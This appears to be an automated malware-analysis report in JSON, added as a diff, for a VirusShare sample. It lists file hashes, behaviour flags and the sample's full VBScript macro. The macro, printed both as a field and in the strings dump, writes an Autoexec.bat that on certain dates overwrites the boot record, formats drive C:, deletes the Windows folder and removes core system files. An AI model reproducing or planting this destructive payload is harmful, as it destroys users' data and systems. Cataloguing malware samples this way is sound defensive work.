@@ -1,0 +1,61 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Autoexec": "Runs when the Word document is opened",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "Dim WSHShell, fso, dir, win, downread\n\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet WSHShell = WScript.CreateObject(\"WScript.Shell\")\nSet win = fso.GetSpecialFolder(0)\nSet dir = fso.GetSpecialFolder(1)\nSet bat = fso.CreateTextFile(\"C:\\Autoexec.bat\", True)\n\nmain()\n\nSub main()\ndie=mid(date,1,2)\n\nIf die=01 Then\nbat.WriteLine \"fdisk /MBR\"\nbat.WriteLine \"echo J|format c:\"\nbat.WriteLine \"echo Y|format c:\"\nbat.WriteLine \"echo Shit|Label C:\"\nEnd If\n\nIf die=10 Then\nbat.WriteLine \"deltree /y %windir%\"\nEnd If\n\nIf die=28 Then\nbat.WriteLine \"del %windir%\\explorer.exe\"\nbat.WriteLine \"del %windir%\\system\\kernel32.dll\"\nEnd If\n\nEnd Sub"
+    },
+    "filename": "VirusShare_380e19e7cf66e56975db1cf9f24f46bf",
+    "filesize": 666,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "380e19e7cf66e56975db1cf9f24f46bf",
+        "sha1": "437d0ccb2b463a0dc79bce8f208ca02a7eb4a7ee",
+        "sha256": "47d8ecf839adb75df41cd3060dc67dd7c2a8e3da9cb996159fb940c179f555a1"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Dim WSHShell, fso, dir, win, downread",
+            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set WSHShell = WScript.CreateObject(\"WScript.Shell\")",
+            "Set win = fso.GetSpecialFolder(0)",
+            "Set dir = fso.GetSpecialFolder(1)",
+            "Set bat = fso.CreateTextFile(\"C:\\Autoexec.bat\", True)",
+            "main()",
+            "Sub main()",
+            "die=mid(date,1,2)",
+            "If die=01 Then",
+            "bat.WriteLine \"fdisk /MBR\"",
+            "bat.WriteLine \"echo J|format c:\"",
+            "bat.WriteLine \"echo Y|format c:\"",
+            "bat.WriteLine \"echo Shit|Label C:\"",
+            "End If",
+            "If die=10 Then",
+            "bat.WriteLine \"deltree /y %windir%\"",
+            "End If",
+            "If die=28 Then",
+            "bat.WriteLine \"del %windir%\\explorer.exe\"",
+            "bat.WriteLine \"del %windir%\\system\\kernel32.dll\"",
+            "End If",
+            "End Sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.300904",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
